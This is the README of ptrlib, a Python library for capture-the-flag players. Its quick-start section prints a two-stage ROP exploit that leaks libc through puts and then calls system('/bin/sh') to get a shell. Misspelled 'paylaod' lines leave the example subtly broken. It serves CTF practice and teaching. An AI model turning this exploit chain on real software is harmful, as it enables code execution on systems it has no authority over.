ptrlib
====

Python library which bundles security-related utilities.

## Description
Ptrlib is a Python library for CTF players.
It's designed to make it easy to write a complex program of cryptography, networking, exploit and so on.

## Requirement
Supports: Python 3.7
Library Dependency: gmpy2

Install GMP library by running
```
$ apt-get install libgmp-dev
```

## Usage
Basic examples are available at [/examples](https://bitbucket.org/ptr-yudai/ptrlib/src/master/examples/).

## Quick Document
There are many functions in ptrlib but let's see how to use it for pwn.
You can run executable or create socket like this:
```python
sock = Process("./pwn01")
sock = Process(["./pwn01", "--debug"])
sock = Socket("localhost", 1234)
```
If you have the target binary or libc, it's recommended to load the binary first.
```python
elf = ELF("./pwn01")
libc = ELF("./libc.so.6")
```
And you can use useful methods such as `got`, `plt`, `symbol`, `section` and so on.
The following is the pwn example of ROP stager.
```python
got_puts = elf.got("puts")
plt_puts = elf.plt("puts")
plt_gets = elf.plt("gets")
stage2 = elf.section(".bss") + 0x400

payload = b'A' * 0x108
payload += p64(rop_pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(rop_pop_rdi)
payload += p64(stage2)
payload += p64(plt_gets)
paylaod += p64(rop_pop_rbp)
paylaod += p64(stage2)
payload += p64(rop_leave_ret)
sock.sendlineafter("Data: ", payload)

libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))
payload = b'A' * 8
paylaod += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendline(payload)

sock.interactive()
```

## Install
Run `pip install ptrlib` or `python setup.py install`.

## Licence

[MIT](https://github.com/tcnksm/tool/blob/master/LICENCE)

## Author

[ptr-yudai](https://github.com/ptr-yudai)
